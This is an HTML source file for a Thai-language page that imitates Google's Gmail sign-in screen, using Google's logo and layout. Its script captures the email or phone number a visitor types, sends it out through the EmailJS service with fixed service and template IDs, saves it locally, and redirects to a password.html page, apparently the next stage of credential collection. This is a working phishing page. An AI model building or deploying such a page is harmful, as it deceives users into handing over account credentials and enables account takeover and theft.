<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>เข้าสู่ระบบ</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #edf2f7;
            margin: 0;
        }
        .login-container {
            display: flex;
            flex-direction: column;
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 900px;
            text-align: left;
        }
        .google-logo {
            width: 100px;
            margin-bottom: 20px;
        }
        h2 {
            font-size: 24px;
            margin: 0;
            font-weight: 500;
        }
        .description {
            font-size: 14px;
            color: #555;
            margin: 15px 0;
        }
        .input-box {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        .forgot-link {
            display: block;
            margin-top: 10px;
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }
        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 20px;
        }
        .register-btn {
            background: none;
            border: none;
            color: #1a73e8;
            font-size: 14px;
            cursor: pointer;
            padding: 5px;
        }
        .register-btn:hover {
            text-decoration: underline;
        }
        .next-btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 14px;
            border-radius: 5px;
            cursor: pointer;
        }
        .next-btn:hover {
            background: #1669c1;
        }
    </style>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        // ทำการ initialize EmailJS ด้วย USER_ID ของคุณ
        emailjs.init("YOUR_USER_ID");  // ใส่ USER_ID ที่ได้จาก EmailJS

        function sendEmail() {
            let email = document.getElementById("email").value;
            if (email.trim() === "") {
                alert("กรุณากรอกอีเมลก่อน!");
                return;
            }

            // ส่งอีเมลผ่าน EmailJS
            emailjs.send("service_0ali0id", "template_3z31m7i", {  // เปลี่ยนเป็น service และ template ของคุณ
                to_name: email,
                from_name: "Your Name",  // ใส่ชื่อของผู้ส่ง
            })
            .then(function(response) {
                console.log('SUCCESS!', response);
                alert("อีเมลถูกส่งไปยัง: " + email);
                localStorage.setItem("userEmail", email);  // บันทึกอีเมลใน localStorage
                window.location.href = "password.html";  // ไปที่หน้าถัดไปกรอกรหัส
            }, function(error) {
                console.log('FAILED...', error);
            });
        }
    </script>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="google-logo">
        <h2>ลงชื่อเข้าใช้</h2>
        <p class="description">ด้วยบัญชี Google เพื่อไปยัง Gmail บัญชีนี้จะพร้อมใช้งานกับแอปอื่นๆ ของ Google ในเบราว์เซอร์</p>
        <input type="text" id="email" class="input-box" placeholder="อีเมลหรือโทรศัพท์">
        <a href="#" class="forgot-link">หากลืมอีเมล</a>
        <div class="actions">
            <button class="register-btn">สร้างบัญชี</button>
            <button class="next-btn" onclick="sendEmail()">ถัดไป</button>
        </div>
    </div>
</body>
</html>
